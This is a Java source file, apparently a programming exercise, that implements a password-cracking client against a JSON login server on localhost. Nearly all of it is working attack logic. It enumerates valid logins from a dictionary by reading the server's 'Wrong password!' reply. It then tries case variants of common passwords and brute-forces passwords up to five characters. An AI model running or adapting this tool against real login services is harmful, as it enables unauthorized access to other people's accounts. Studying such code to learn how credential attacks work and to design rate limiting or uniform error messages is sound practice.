package Task4;

import java.io.*;
import java.net.Socket;

import com.google.gson.Gson;

public class Client {
    public static final String DICTIONARY_PASSWORDS_FILE_PATH = "passwords.txt";
    public static final String DICTIONARY_LOGINS_FILE_PATH = "logins.txt";
    private static final char[] CHARACTERS = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789!_@".toCharArray();


    private static final int MAX_LENGTH = 5;
    private static ServerSession currentSession;

    static class ServerSession implements AutoCloseable {
        static class ServerAnswer {
            public String result;
            public static ServerAnswer fromJson(String jsonString) {
                Gson gson = new Gson();
                return gson.fromJson(jsonString, ServerAnswer.class);
            }
        }

        private static class AccessData {
            private String login;
            private String password;

            public AccessData(String login, String password) {
                this.login = login;
                this.password = password;
            }

            public String toJson() {
                Gson gson = new Gson();
                return gson.toJson(this);
            }
        }

        private String login;
        private String password;
        private Socket socket;
        private DataInputStream input;
        private DataOutputStream output;

        ServerSession(String serverAddress, int serverPort) throws IOException
        {
            socket = new Socket(serverAddress, serverPort);
            input = new DataInputStream(socket.getInputStream());
            output = new DataOutputStream(socket.getOutputStream());
        }
        public void setLogin(String login) {
            this.login = login;
        }

        public void setPassword(String password) {
            this.password = password;
        }

        public String getLogin() {
            return login;
        }

        public String getPassword() {
            return password;
        }

        public ServerAnswer tryAuthorize() throws IOException {
            AccessData data = new AccessData(this.login, this.password);
            output.writeUTF(data.toJson());

            String serverResponse = input.readUTF();
            return ServerAnswer.fromJson(serverResponse);
        }

        @Override
        public void close() throws IOException {
            input.close();
            output.close();
            socket.close();

        }
    }

    public static void main(String[] args) {
        final String serverAddress = "127.0.0.1";
        final int serverPort = 34522;

        try (ServerSession session = new ServerSession(serverAddress, serverPort)){
            currentSession = session;
            try {
                long startTime = System.currentTimeMillis();
                PasswordFindResult result = PasswordFindResult.notFound();
                String foundLogin = findLoginDictionary(DICTIONARY_LOGINS_FILE_PATH);
                currentSession.setLogin(foundLogin);
                if (currentSession.getLogin() != null) {
                    // Before brute forcing (slow) check the common passwords from the rainbow table (faster).
                    result = findPasswordRainbowTable(DICTIONARY_PASSWORDS_FILE_PATH);
                    if (!result.isFound) {
                        result = findPasswordBruteForce(CHARACTERS, MAX_LENGTH);
                    }
                    currentSession.setPassword(result.password);
                }

                System.out.println("The login is: " + currentSession.getLogin());
                System.out.println("The password is: " + currentSession.getPassword());
                long endTime = System.currentTimeMillis();

                System.out.println("Time: " + (endTime - startTime)/1000 + " s");

            } catch (IOException e) {
                System.out.println("Exception:" + e.getMessage() + " " + e.getClass().getSimpleName());
            }
        } catch (IOException e) {
            System.out.println("Connection to server exception:" + e.getMessage());
        }
    }

    private static String findLoginDictionary(String dictionaryFilePath) throws IOException {
        try (FileReader fileReader = new FileReader(dictionaryFilePath);
             BufferedReader reader = new BufferedReader(fileReader)
        ) {
            String dictionaryLogin;
            while ((dictionaryLogin = reader.readLine()) != null) {

                boolean isCorrectLoginFind = isLoginCorrect(dictionaryLogin);

                if (isCorrectLoginFind) {

                    return dictionaryLogin;
                }
            }
        }
        return null;
    }

    private static boolean isLoginCorrect(String loginFromTable) throws IOException {
        currentSession.setLogin(loginFromTable);
        currentSession.setPassword("&");

        ServerSession.ServerAnswer response = currentSession.tryAuthorize();

        if (response.result.equals("Wrong password!")) {
            return true;
        }
        return false;
    }

    private static PasswordFindResult findPasswordRainbowTable(String tableFilePath) throws IOException {
        try (FileReader fileReader = new FileReader(tableFilePath);
             BufferedReader reader = new BufferedReader(fileReader)
        ) {
            String dictionaryPassword;
            while ((dictionaryPassword = reader.readLine()) != null) {

                char[] dictionaryPasswordArray = dictionaryPassword.toLowerCase().toCharArray();

                int cycle = 0;

                PasswordFindResult result = checkAllCasesRecursive(dictionaryPasswordArray, cycle);
                if (result.isFound) {
                    return result;
                }
            }
        }
        return PasswordFindResult.notFound();
    }

    static class PasswordFindResult {
        public String password;
        public boolean isFound;
        PasswordFindResult(String password, boolean isFound)
        {
            this.password = password;
            this.isFound = isFound;
        }
        public static PasswordFindResult notFound() {
            return new PasswordFindResult(null, false);
        }
    }

    private static PasswordFindResult checkAllCasesRecursive(char[] passwordGuess, int cycle) throws IOException {
        if (cycle == passwordGuess.length - 1) {
            boolean isFound = isPasswordCorrect(new String(passwordGuess));
            if (isFound) {
                return new PasswordFindResult(new String(passwordGuess), true);
            } else {
                makeCharUpperCase(passwordGuess, cycle);
                isFound = isPasswordCorrect(new String(passwordGuess));
                if (isFound) {
                    return new PasswordFindResult(new String(passwordGuess), true);
                }
                makeCharLowerCase(passwordGuess, cycle);
            }
        } else {
            PasswordFindResult result = checkAllCasesRecursive(passwordGuess, cycle + 1);
            if (result.isFound) {
                return result;
            }

            makeCharUpperCase(passwordGuess, cycle);
            result = checkAllCasesRecursive(passwordGuess, cycle + 1);
            if (result.isFound) {
                return result;
            }
            makeCharLowerCase(passwordGuess, cycle);
        }
        return PasswordFindResult.notFound();
    }

    private static boolean isPasswordCorrect(String password) throws IOException {
        // login was set previously
        currentSession.setPassword(password);

        ServerSession.ServerAnswer serverAnswer = currentSession.tryAuthorize();

        if (serverAnswer.result.equals("Connection success!")) {
            return true;
        }
        return false;
    }

    private static void makeCharUpperCase(char[] charArray, int charIndex) {
        char targetChar = charArray[charIndex];
        if (Character.isLetter(targetChar)) {
            charArray[charIndex] = (Character.toUpperCase(targetChar));
        }
    }

    private static void makeCharLowerCase(char[] charArray, int charIndex) {
        char targetChar = charArray[charIndex];
        if (Character.isLetter(targetChar)) {
            charArray[charIndex] = (Character.toLowerCase(targetChar));
        }
    }


    private static PasswordFindResult findPasswordBruteForce(char[] possibleCharacters, int maxLength) throws IOException {
        for (int length = 1; length <= maxLength; length++) {
            PasswordFindResult result = crackPasswordRecursive("", possibleCharacters, length);
            if (result.isFound) {
                return result;
            }
        }
        return PasswordFindResult.notFound();
    }

    private static PasswordFindResult crackPasswordRecursive(String findPassword, char[] possibleCharacters, int length) throws IOException {
        if (findPassword.length() == length) {
            if (isPasswordCorrect(findPassword)) {
                return new PasswordFindResult(findPassword, true);
            }
        } else {
            for (char c : possibleCharacters) {
                PasswordFindResult result = crackPasswordRecursive(findPassword + c, possibleCharacters, length);
                if (result.isFound) {
                    return result;
                }
            }
        }
        return PasswordFindResult.notFound();
    }




}